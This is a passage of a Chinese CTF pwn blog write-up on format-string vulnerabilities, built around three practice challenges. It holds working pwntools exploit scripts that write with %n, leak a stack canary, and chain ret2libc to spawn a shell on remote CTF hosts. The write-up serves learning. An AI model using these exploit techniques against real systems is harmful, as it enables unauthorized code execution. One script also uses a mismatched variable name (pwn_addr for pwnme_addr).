+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130201152082-1056185645.png" alt="image" /><br />
+通过计算可以得出在printf里的可控参数偏移量为6<br />
+接下来就是该动态调试了，确认&amp;name在printf里的偏移量，断点下在read函数，然后在<strong>调用printf时进入stack中查看偏移量</strong><br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130201346914-112111018.png" alt="image" /><br />
+可以看到，<strong>此时name相对rdi的偏移量为0x20，换算为十进制就是32，那么总体的偏移量就是32+6=38</strong><br />
+②.在gdb调试的时候使用&quot;<strong>fmtarg addr</strong>&quot;进行偏移量求取，这可比我数快多了<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202312/3326078-20231201094821051-1803334501.png" alt="image" /><br />
+PS：其实还有第三种方法，就是pwntools里提供的类（可以近似理解为struct)FmtStr和函数fmtstr_payload函数，学会这个后能大大提高我们做格式化字符串漏洞题目的速度，不过博主其实还搞不懂它的格式和原理，有兴趣的小伙伴可以看这个链接</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33976344/article/details/113503914">https://blog.csdn.net/qq_33976344/article/details/113503914</a></p>
+</blockquote>
+<p>此时，直接nc即可<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130201611299-2055057684.png" alt="image" /><br />
+这就直接拿到了flag的值，这既是%s的基础应用，直接拿取flag</p>
+<h3 id="2cgfsbn的基础用法"><a class="markdownIt-Anchor" href="#2cgfsbn的基础用法"></a> ②.CGfsb(%n的基础用法)</h3>
+<p>checksec<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130202424510-1409818700.png" alt="image" /><br />
+RELRO和NX开了，不多赘述，Canary也是开的，表明我们如果没法泄露出Canary的值就没办法进行栈溢出，但要不要这样做，还得看题目要求，先看题目代码<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130202702867-971226393.png" alt="image" /><br />
+还是一眼看出格式化字符串漏洞，然后就是后面紧跟着“如果pwnme==8，你就可以拿到flag，否则啥也没有”的逻辑，那思路就是篡改pwnme地址里储存的值，将其改为8即可，那么现在就是要先<strong>拿到pwnme的地址</strong>，然后<strong>篡改</strong>里边的内容。IDA里很容易就能找到pwnme的地址<br />
+<strong>bss区可以理解为尚未赋值的区域</strong>,比如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br></pre></td></tr></table></figure>
+<p>就像这里边的a，只是定义了a这个变量，但还等着你往里面输入数值呢。<br />
+好了，拿到地址后就该<strong>泄露printf里的可控参数</strong>了，<strong>nc</strong>，启动！<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130203732746-999822084.png" alt="image" /><br />
+前边有演示过怎么数了，我这次就不p图了，随便数一下就能算出可控参数的偏移量为10，ok,现在就可以构造脚本了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote (<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">65204</span>)</span><br><span class="line"><span class="comment">#offset = 10</span></span><br><span class="line">pwnme_addr = <span class="number">0x804A068</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Dusk&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;please:\n&quot;</span>)</span><br><span class="line">payload = p32(pwn_addr) + <span class="string">b&#x27;aaaa%10$n&#x27;</span> <span class="comment">#因为是32位，所以用p32打包，而p32占4字节，为了将pwnme赋值为8，我们需要填充垃圾数值，于是填充了&#x27;aaaa&#x27;，这下就成功打印了8位数字了，于是使用%10$n(此时pwnme_addr位于printf的格式化字符串参数的第十个餐宿上)将pwnme赋值为8了</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行脚本即可<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130204416608-1439661651.png" alt="image" /><br />
+这就是%n的基本用法，%n会有很多拓展题，比如连续的用%n赋不同数值，计算的偏移量会有所不同，不过这都是比较难的题了，博主本人也不会写，所以就写个基础格式化字符串漏洞题目，希望大家都能有所收获</p>
+<h3 id="32021-鹤城杯littleof使用格式化字符串漏洞泄露canary值"><a class="markdownIt-Anchor" href="#32021-鹤城杯littleof使用格式化字符串漏洞泄露canary值"></a> ③.[2021 鹤城杯]littleof（使用格式化字符串漏洞泄露Canary值)</h3>
+<p>懒了！<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130205209165-483184888.png" alt="image" /><br />
+太喜欢，canary开了捏，栈溢出难用了捏，看看IDA代码吧~<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130205345361-1218213793.png" alt="image" /><br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130205347227-19446162.png" alt="image" /><br />
+看得出来，Canary的值被储存在了v3中，v3也包含在buf里，而第二个printf函数可以泄露出Canary值，那么我们现在要做的就是先确定<strong>v3相对于buf的偏移量</strong>，<strong>确保不会冲掉Canary</strong><br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130210841861-887187303.png" alt="image" /><br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130210846052-558394008.png" alt="image" /><br />
+可以算出offset = 0x50 - 0x08 == 0x48<br />
+获取偏移量后，我们就要开始泄露Canay的值了，要合理利用printf里给的%s，<strong>泄露出Canary的值</strong>，因为它会读取buf里所有值，所以它理所当然会读取到Canary的值，我们只需要从最后一个垃圾值开始接收数据就好，此时的脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level= <span class="string">&quot;debug&quot;</span>)<span class="comment">#开启debug是为了更好查看Canary的值是如何接收的</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28565</span>)</span><br><span class="line">offset_canary = <span class="number">0x50</span> - <span class="number">0x08</span> <span class="comment">#result == 0x48</span></span><br><span class="line">payload_canary = offset_canary * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">p.sendline(payload_canary)</span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&quot;</span>)<span class="comment">#在垃圾值之后开始接收Canary的数值，有个&quot;\n&quot;是因为sendline会发送一个&quot;\n&#x27;，不能让它影响后面的数据接收</span></span><br><span class="line">canary_addr_first = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#虽然Canary占8字节，但是Canary默认是&#x27;\x00&#x27;结尾的，所以我们只用接收7字节，不过我到现在还没弄懂ljust和rjust填充&#x27;\x00&#x27;有什么区别，ljust过不了而rjust却能过</span></span><br><span class="line"><span class="comment">#log.success(&quot;Canary:&quot;+(hex(canary_addr_first)))</span></span><br></pre></td></tr></table></figure>
+<p>在获取Canary值后，就可以进行栈溢出了。但是从刚刚IDA里我们没有找到后门函数，里边也没有system函数和bin/sh，那这又是激动人心的ret2libc环节，好耶！<br />
+那么又是ROPgadget起手时刻！<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130213404122-894260468.png" alt="image" /><br />
+OK，是心动的感觉，又可以构造脚本了~</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这是包含上边的脚本的！为了便于理解所以分了两次来写</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2021_鹤城杯_littleof&#x27;</span>)</span><br><span class="line">rdi_ret_addr = <span class="number">0x400863</span></span><br><span class="line">ret_addr = <span class="number">0x40059e</span> </span><br><span class="line">&gt; 需要ret的原因见我上一篇博客ret2libc:https://www.cnblogs.com/falling-dusk/p/<span class="number">17856141.</span>html<span class="comment">#需要ret的原因见我上一篇博客ret2libc:https://www.cnblogs.com/falling-dusk/p/17856141.html</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400789</span></span><br><span class="line">payload_overflow_first = offset_canary * <span class="string">b&#x27;A&#x27;</span> + p64(canary_addr_first) + <span class="number">0x08</span> * <span class="string">b&#x27;A&#x27;</span> + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) <span class="comment">#泄露出puts函数的真实地址并跳转回main进行循环</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try harder!&#x27;</span>)</span><br><span class="line">p.sendline(payload_overflow_first)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I hope you win\n&quot;</span>)</span><br><span class="line">real_puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#接收puts函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,real_puts_addr)<span class="comment">#libc.so版本搜寻</span></span><br><span class="line">libc_base = real_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">p.sendline(payload_canary)</span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&quot;</span>)</span><br><span class="line">canary_addr_second = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#因为每次装载程序时地址都会随机化，同样Canary值也会改变，所以还需要再泄露一遍</span></span><br><span class="line">payload_overflow_second = offset_canary * <span class="string">b&#x27;A&#x27;</span> + p64(canary_addr_second) + <span class="number">0x08</span> * <span class="string">b&#x27;A&#x27;</span> + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try harder!&#x27;</span>)</span><br><span class="line">p.sendline(payload_overflow_second)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这是分两次的脚本，合起来如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher </span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28565</span>) </span><br><span class="line">elf = ELF(<span class="string">&#x27;./2021_鹤城杯_littleof&#x27;</span>)</span><br><span class="line">offset_canary = <span class="number">0x50</span> - <span class="number">0x08</span> <span class="comment">#result == 0x48</span></span><br><span class="line">payload_canary = offset_canary * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">rdi_ret_addr = <span class="number">0x400863</span></span><br><span class="line">ret_addr = <span class="number">0x40059e</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400789</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">p.sendline(payload_canary)</span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&quot;</span>)</span><br><span class="line">canary_addr_first = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary:&quot;</span>+(<span class="built_in">hex</span>(canary_addr_first)))</span><br><span class="line">payload_overflow_first = offset_canary * <span class="string">b&#x27;A&#x27;</span> + p64(canary_addr_first) + <span class="number">0x08</span> * <span class="string">b&#x27;A&#x27;</span> + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try harder!&#x27;</span>)</span><br><span class="line">p.sendline(payload_overflow_first)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I hope you win\n&quot;</span>)</span><br><span class="line">real_puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,real_puts_addr)</span><br><span class="line">libc_base = real_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">p.sendline(payload_canary)</span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&quot;</span>)</span><br><span class="line">canary_addr_second = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">payload_overflow_second = offset_canary * <span class="string">b&#x27;A&#x27;</span> + p64(canary_addr_second) + <span class="number">0x08</span> * <span class="string">b&#x27;A&#x27;</span> + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try harder!&#x27;</span>)</span><br><span class="line">p.sendline(payload_overflow_second)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="运行脚本选对libcso的版本即可image"><a class="markdownIt-Anchor" href="#运行脚本选对libcso的版本即可image"></a> 运行脚本，选对libc.so的版本即可<br />
+<img src="https://img2023.cnblogs.com/blog/3326078/202311/3326078-20231130214618369-293825995.png" alt="image" /></h2>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结：</h2>
+<p>虽然各位佬都说格式化字符串漏洞很简单，但我真不这么觉得，我总觉得这比我当初学ret2libc还<strong>难</strong>，这个的攻击手法更多，而且需要的<strong>操作控制也更精细</strong>，难度就非常灵活，简单的确实就是跟基础题差不多，难的就是要<strong>各种调试</strong>，计算不同的偏移量，<strong>控制输出程度</strong>，总体而言非常的费脑细胞，让我非常痛苦，我只希望在接下来的时间里能更加熟练格式化字符串，争取做出更多的题，这样我才有信心去学习堆啊（悲）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Stack/" rel="tag">Stack</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://s2.loli.net/2024/11/29/LP9IMy5m2x1O7Cb.jpg" data-sizes="auto" alt="pwn常见绕过" class="lazyload">
+          
+        
+        <a href="/2023/12/02/%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            pwn常见绕过
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/11/29/BWUfxhRNo2eOdq5.png" data-sizes="auto" alt="ret2libc" class="lazyload">
+        
+      
+      <a href="/2023/11/25/ret2libc/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          ret2libc
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.2.</span> <span class="toc-text"> 格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 基本格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#parameter"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> parameter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#length"><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> length</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#field-width"><span class="toc-number">1.2.1.3.</span> <span class="toc-text"> field width</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#type%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8D%A0%E4%BD%8D%E7%AC%A6%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.1.4.</span> <span class="toc-text"> type(格式化字符串占位符类型)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#di"><span class="toc-number">1.2.1.4.1.</span> <span class="toc-text"> %d&#x2F;%i</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#u"><span class="toc-number">1.2.1.4.2.</span> <span class="toc-text"> %u</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xx"><span class="toc-number">1.2.1.4.3.</span> <span class="toc-text"> %x&#x2F;%X</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lx"><span class="toc-number">1.2.1.4.4.</span> <span class="toc-text"> %lx</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#p"><span class="toc-number">1.2.1.4.5.</span> <span class="toc-text"> %p</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#xlxp%E7%9A%84%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.1.4.5.1.</span> <span class="toc-text"> %x,%lx,%p的建议</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#s"><span class="toc-number">1.2.1.4.6.</span> <span class="toc-text"> %s</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#c"><span class="toc-number">1.2.1.4.7.</span> <span class="toc-text"> %c</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#n"><span class="toc-number">1.2.1.4.8.</span> <span class="toc-text"> %n</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1n%E7%9A%84%E8%A1%8D%E7%94%9F"><span class="toc-number">1.2.1.4.8.1.</span> <span class="toc-text"> ①%n的衍生</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2n%E5%8F%8A%E5%85%B6%E8%A1%8D%E7%94%9F%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B0%8F%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.1.4.8.2.</span> <span class="toc-text"> ②%n及其衍生的使用小建议</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 攻击手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%80%9A%E8%BF%87ida%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E8%83%BD%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AF%BB%E6%89%BE%E6%9C%89%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text"> ①.通过IDA（或者其它能反编译的工具)寻找有格式化字符串漏洞的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E5%90%8E%E9%80%9A%E8%BF%87nc%E8%BF%9E%E6%8E%A5%E5%90%8E%E6%B1%82%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text"> ②.找到漏洞函数后，通过nc连接后，求偏移量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%9B%A0%E9%A2%98%E8%80%8C%E5%BC%82"><span class="toc-number">1.3.3.</span> <span class="toc-text"> ③.因题而异</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1hnctf-2022-week1fmtstrres%E7%9A%84%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8"><span class="toc-number">1.4.1.</span> <span class="toc-text"> ①.[HNCTF 2022 Week1]fmtstrre（%s的基础应用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2cgfsbn%E7%9A%84%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-number">1.4.2.</span> <span class="toc-text"> ②.CGfsb(%n的基础用法)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32021-%E9%B9%A4%E5%9F%8E%E6%9D%AFlittleof%E4%BD%BF%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary%E5%80%BC"><span class="toc-number">1.4.3.</span> <span class="toc-text"> ③.[2021 鹤城杯]littleof（使用格式化字符串漏洞泄露Canary值)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC%E9%80%89%E5%AF%B9libcso%E7%9A%84%E7%89%88%E6%9C%AC%E5%8D%B3%E5%8F%AFimage"><span class="toc-number">1.5.</span> <span class="toc-text"> 运行脚本，选对libc.so的版本即可
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text"> 总结：</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        38.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:45
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
